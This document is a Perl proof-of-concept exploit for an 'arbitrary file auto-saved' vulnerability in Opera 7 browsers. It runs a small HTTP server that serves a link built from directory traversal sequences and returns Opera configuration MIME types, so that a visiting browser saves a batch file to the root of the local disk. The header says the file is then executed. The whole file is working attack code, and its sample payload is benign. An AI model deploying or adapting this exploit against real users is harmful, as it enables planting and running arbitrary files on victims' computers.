#!/usr/bin/perl
##################################################
#
# Sample code of
#   "[Opera 7] Arbitrary File Auto-Saved Vulnerability."
#   
#   This Exploit will run a webserver that will create and execute a batch 
#   file on the victim's computer when visiting this malicious server
#
#   This perl script is a small HTTP server for a check ofthe vulnerability.
#   BTW, you can exploit this vulnerability without a server like this 
#   if your apache or etc., allow a request URL that contains '..'.
#
# Tested on :
#   Opera 7.22
#   Opera 7.21
#   Opera 7.20
#   Opera 7.1X
#   Opera 7.0X
#
#   with Active Perl 5.8.0 on Windows 2000 Pro SP4 JP.
#   (maybe need Perl 5.6 or later)
#
# Usage :
#  [0] Execute "perl this_script 10080" on a console,
#      this server starts to listen in port 10080.
#  [1] Opera opens "http://127.0.0.1:10080/".
#  [2] Click link.
#  [3] Auto-saved an arbitrary file on a root directory
#      of Local Disk ...
#
# 2003/11/15
# written by nesumin <nesumin softhome net>
# public on www.k-otik.com
#
###################################################
use HTTP::Daemon;
use HTTP::Status;

use constant URL => '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C_opera_.bat';

use constant FILE_CONTENT => qq~\@echo off\x0D\x0Aecho "Love & Peace :-)"\x0D\x0A\@pause~;
use constant RES_HEADERS => qw(Pragma no-cache Connection close);
use constant REUSE => 1;
use constant VIEW_DATA => 0;


my @MIMETYPES = qw(
application/x-opera-configuration-keyboard
application/x-opera-configuration-menu
application/x-opera-configuration-mouse
application/x-opera-configuration-toolbar
application/x-opera-configuration-skin
application/x-opera-skin
);
my $port = ($ARGV[0] || 10080) + 0;
die("port is not correct") unless (0 < $port && $port < 65536);

my $daemon = new HTTP::Daemon(LocalPort=>$port, Reuse=>REUSE)
or die("HTTP::Daemon->new() error : $!.\n");
select(STDERR);
printf("[*] server started on %d.\n", $daemon->sockport());

while (my $ccon = $daemon->accept()) {
printf("[*] incoming client : from %s:%d(%08X).\n",
 inet_ntoa($ccon->peeraddr()), $ccon->peerport(), $ccon);
if (my $req = $ccon->get_request()) {
 print("\n[*] request received...\n", map{" >>  $_\n"}
  ($req->as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);
 if ($req->method eq 'GET') {
  my $url = URL;
  my $res = new HTTP::Response(200, 'OK', new HTTP::Headers(RES_HEADERS));
  $res->protocol("HTTP/1.0");
  if ($req->url->path eq '/') {
   $res->header('Content-type'=>'text/html');
   $res->content(qq~<a href="$url">Click here</a>~);
  
  } else {

   my $mimetype = $MIMETYPES[rand(@MIMETYPES)];
   if ($req->header('User-Agent')=~m~Opera[\s+/]((\d\.\d)\d)~i){
    # Opera 7.0x
    if ($2 eq "7.0") {
     $url .= '*.zip';# '*' is a special char :-)
     $mimetype = $MIMETYPES[$#MIMETYPES];
    # Opera 7.22
    } elsif ($1 eq "7.22") {
     $mimetype = $MIMETYPES[rand(@MIMETYPES-2)];
    }
   }

   $res->header('Content-type'=>$mimetype);
   $res->content(FILE_CONTENT);
  }
  $ccon->send_response($res);
  print("\n[*] response sent...\n", map{" >>  $_\n"}
   ($res->as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);
 } else {
  $ccon->send_error(RC_METHOD_NOT_ALLOWED);
 }
}
printf("[*] client closed : from %s:%d (%08X).\n",
 inet_ntoa($ccon->peeraddr()), $ccon->peerport(), $ccon);
$ccon->close();
undef($ccon);
}
print("[*] server closed.\n");
$daemon->close();
undef($daemon);
